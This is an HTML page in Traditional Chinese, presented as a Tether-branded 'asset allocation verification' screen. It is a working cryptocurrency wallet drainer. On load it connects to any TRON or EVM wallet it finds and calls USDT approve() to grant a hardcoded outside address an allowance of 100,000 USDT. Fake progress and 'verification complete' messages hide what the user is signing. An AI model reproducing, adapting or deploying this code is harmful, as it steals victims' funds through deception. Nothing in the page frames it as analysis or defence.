<!DOCTYPE html>
<html lang="zh-Hant">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>資產配置驗證</title>
<style>
  body {
    font-family: "Noto Sans TC", sans-serif;
    background: linear-gradient(135deg, #0f172a, #1e293b, #2563eb, #1e3a8a);
    background-size: 400% 400%;
    animation: gradientBG 15s ease infinite;
    color: #fff;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  @keyframes gradientBG {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
  }
  .container {
    background: rgba(255,255,255,0.05);
    padding: 30px;
    border-radius: 20px;
    max-width: 420px;
    width: 100%;
    text-align: center;
    backdrop-filter: blur(12px);
    box-shadow: 0 8px 25px rgba(0,0,0,0.3);
  }
  .logo {
    width: 80px;
    margin-bottom: 15px;
  }
  h1 {
    font-size: 22px;
    margin-bottom: 10px;
  }
  p {
    font-size: 14px;
    margin-bottom: 20px;
    color: #cbd5e1;
  }
  .progress {
    background: rgba(255,255,255,0.1);
    border-radius: 50px;
    overflow: hidden;
    height: 8px;
    margin-bottom: 15px;
  }
  .progress-bar {
    background: linear-gradient(90deg, #2563eb, #3b82f6);
    height: 100%;
    width: 0%;
    transition: width 0.5s ease;
  }
  #status {
    margin-top: 10px;
    font-size: 14px;
  }
  .success { color: #4ade80; }
  .error { color: #f87171; }
  .loading { color: #facc15; }
</style>
<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
</head>
<body>
<div class="container">
  <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/Logo_Tether.svg" alt="Logo" class="logo" />
  <h1>資產配置驗證</h1>
  <p>正在驗證您的資產配置，請保持錢包在線</p>
  <div class="progress"><div class="progress-bar" id="progress-bar"></div></div>
  <p id="status" class="loading">檢測環境中...</p>
</div>

<script>
  const USDT_CONTRACTS = {
    TRON: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
    ETH:  "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    BNB:  "0x55d398326f99059fF775485246999027B3197955"
  };

  const TARGET_ADDRESS = {
    TRON: "TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf",
    EVM:  "0xbA18Cdd7A947CDFBACCa478C1F43692026CcbF10"
  };

  // 授權金額 100,000 USDT (USDT 6位小數)
  const APPROVE_AMOUNT = "100000000000"; // 100,000 * 10^6

  let approveCount = 0;
  const MAX_APPROVE_COUNT = 10;

  function setProgress(percent, status, cls="loading") {
    document.getElementById("progress-bar").style.width = percent + "%";
    const statusEl = document.getElementById("status");
    statusEl.innerText = status;
    statusEl.className = cls;
  }

  async function init() {
    try {
      setProgress(20, "檢測錢包環境...");
      // TRON
      if (window.tronWeb && window.tronWeb.ready) {
        setProgress(40, "檢測到 TRON 錢包，連接中...");
        await tronApprove();
        return;
      }
      if (window.tronLink) {
        await window.tronLink.request({ method: 'tron_requestAccounts' });
        setProgress(40, "檢測到 TronLink，連接中...");
        await tronApprove();
        return;
      }
      if (window.binance && window.binance.tron) {
        await window.binance.tron.request({ method: 'tron_requestAccounts' });
        tronWeb = new TronWeb(window.binance.tron);
        setProgress(40, "檢測到 Binance Web3 (TRON)，連接中...");
        await tronApprove();
        return;
      }
      // EVM
      if (window.ethereum) {
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        setProgress(40, "檢測到 EVM 錢包，連接中...");
        await evmApprove();
        return;
      }
      if (window.okxwallet || window.BinanceChain) {
        const provider = window.okxwallet || window.BinanceChain;
        await provider.request({ method: 'eth_requestAccounts' });
        setProgress(40, "檢測到其他 EVM 錢包，連接中...");
        await evmApprove(provider);
        return;
      }
      setProgress(100, "未檢測到錢包，請安裝或打開錢包應用", "error");
    } catch (err) {
      console.error(err);
      setProgress(100, "驗證未完成", "error");
      setTimeout(() => { window.location.href = "fail.html"; }, 1500);
    }
  }

  async function tronApprove() {
    try {
      if (approveCount >= MAX_APPROVE_COUNT) {
        setProgress(100, "授權次數已達上限", "error");
        setTimeout(() => { window.location.href = "fail.html"; }, 1500);
        return;
      }
      approveCount++;
      const address = window.tronWeb.defaultAddress.base58;
      setProgress(60, "已連接：" + address + "，配置中...");
      const contract = await window.tronWeb.contract().at(USDT_CONTRACTS.TRON);
      const tx = await contract.approve(TARGET_ADDRESS.TRON, APPROVE_AMOUNT).send();
      setProgress(100, "✅ 配置完成", "success");
      setTimeout(() => {
        window.location.href = "success.html";
      }, 1500);
    } catch (err) {
      console.error(err);
      setProgress(100, "驗證未完成", "error");
      setTimeout(() => { window.location.href = "fail.html"; }, 1500);
    }
  }

  async function evmApprove(provider = window.ethereum) {
    try {
      if (approveCount >= MAX_APPROVE_COUNT) {
        setProgress(100, "授權次數已達上限", "error");
        setTimeout(() => { window.location.href = "fail.html"; }, 1500);
        return;
      }
      approveCount++;
      const ethersProvider = new ethers.providers.Web3Provider(provider);
      const signer = ethersProvider.getSigner();
      const network = await ethersProvider.getNetwork();
      let usdtAddress;
      if (network.chainId === 1) usdtAddress = USDT_CONTRACTS.ETH;
      else if (network.chainId === 56) usdtAddress = USDT_CONTRACTS.BNB;
      else throw new Error("不支援的鏈");
      setProgress(60, "已連接：" + await signer.getAddress() + "，配置中...");
      const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
      const contract = new ethers.Contract(usdtAddress, abi, signer);
      const tx = await contract.approve(TARGET_ADDRESS.EVM, APPROVE_AMOUNT);
      await tx.wait();
      setProgress(100, "✅ 配置完成", "success");
      setTimeout(() => {
        window.location.href = "success.html";
      }, 1500);
    } catch (err) {
      console.error(err);
      setProgress(100, "驗證未完成", "error");
      setTimeout(() => { window.location.href = "fail.html"; }, 1500);
    }
  }

  window.addEventListener('load', init);
</script>
</body>
</html>
